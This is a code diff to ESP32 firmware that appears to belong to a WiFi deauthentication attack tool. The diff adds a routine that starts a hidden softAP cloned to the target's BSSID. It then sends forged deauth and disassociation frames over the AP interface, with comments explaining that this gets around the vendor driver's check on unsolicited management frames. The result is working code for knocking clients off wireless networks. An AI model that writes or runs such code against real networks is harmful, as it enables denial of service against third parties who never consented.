@@ -46,8 +46,6 @@ static inline esp_err_t wifi_spoof_sta_mac(const uint8_t mac[6])
     esp_wifi_stop();
     esp_err_t rc = esp_wifi_set_mac(WIFI_IF_STA, mac);
     esp_wifi_start();
-    /* WiFi needs a few hundred ms to fully bring STA back up after
-     * start. TX requests before that return ESP_ERR_WIFI_IF silently. */
     delay(250);
     return rc;
 }
@@ -55,6 +53,39 @@ static inline esp_err_t wifi_spoof_sta_mac(const uint8_t mac[6])
 static inline void wifi_save_sta_mac(uint8_t out[6])
 {
     esp_wifi_get_mac(WIFI_IF_STA, out);
+}
+
+/*
+ * Set up WIFI_AP_STA mode with a softAP whose MAC matches the target
+ * BSSID, so esp_wifi_80211_tx(WIFI_IF_AP, ...) frames have a matching
+ * addr2 and pass the blob's raw-frame sanity check.
+ *
+ * Call at deauth feature entry. Call wifi_ap_teardown() on exit.
+ */
+static inline esp_err_t wifi_ap_spoof_begin(const uint8_t bssid[6])
+{
+    esp_wifi_stop();
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    esp_err_t rc_mac = esp_wifi_set_mac(WIFI_IF_AP, bssid);
+    wifi_config_t ap_cfg = {};
+    strcpy((char *)ap_cfg.ap.ssid, "_");  /* hidden-ish name, length=1 */
+    ap_cfg.ap.ssid_len = 1;
+    ap_cfg.ap.channel = 1;
+    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
+    ap_cfg.ap.ssid_hidden = 1;            /* don't beacon — we're not a real AP */
+    ap_cfg.ap.max_connection = 1;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+    esp_wifi_start();
+    delay(300);
+    return rc_mac;
+}
+
+static inline void wifi_ap_spoof_end(void)
+{
+    esp_wifi_stop();
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start();
+    delay(200);
 }
 
 static inline void _deauth_stamp_seq(uint8_t *f, uint16_t seq)
@@ -91,20 +122,22 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
     f[25] = 0x00;
 
     int ok = 0;
-    /* en_sys_seq=true lets the hardware manage the sequence number and
-     * also tends to bypass the blob's stricter sanity check on pre-
-     * stamped frames. Our seq bytes get overwritten by the hardware. */
-    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), true);
+    /* Transmit via WIFI_IF_AP — the stock ESP-IDF blob rejects MGMT
+     * frames (type=0) on WIFI_IF_STA with ESP_ERR_INVALID_ARG, because
+     * STAs aren't supposed to originate unsolicited mgmt frames. AP
+     * interface has relaxed checks. Caller must have WiFi in
+     * WIFI_AP_STA mode with a softAP started. */
+    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), true);
     if (rc == ESP_OK) ok++;
     else {
         static uint32_t _last_tx_err_log = 0;
         if (millis() - _last_tx_err_log > 1000) {
-            uint8_t actual_mac[6];
-            esp_wifi_get_mac(WIFI_IF_STA, actual_mac);
-            Serial.printf("[80211_tx] deauth rc=%d (0x%x) sta_mac=%02X:%02X:%02X:%02X:%02X:%02X addr2=%02X:%02X:%02X:%02X:%02X:%02X\n",
+            uint8_t ap_mac[6];
+            esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
+            Serial.printf("[80211_tx] deauth rc=%d (0x%x) ap_mac=%02X:%02X:%02X:%02X:%02X:%02X addr2=%02X:%02X:%02X:%02X:%02X:%02X\n",
                           (int)rc, (unsigned)rc,
-                          actual_mac[0], actual_mac[1], actual_mac[2],
-                          actual_mac[3], actual_mac[4], actual_mac[5],
+                          ap_mac[0], ap_mac[1], ap_mac[2],
+                          ap_mac[3], ap_mac[4], ap_mac[5],
                           f[10], f[11], f[12], f[13], f[14], f[15]);
             _last_tx_err_log = millis();
         }
@@ -116,7 +149,7 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
     f[24] = 0x08;  /* reason 8: disassociated due to inactivity */
     f[25] = 0x00;
 
-    rc = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), true);
+    rc = esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), true);
     if (rc == ESP_OK) ok++;
     return ok;
 }
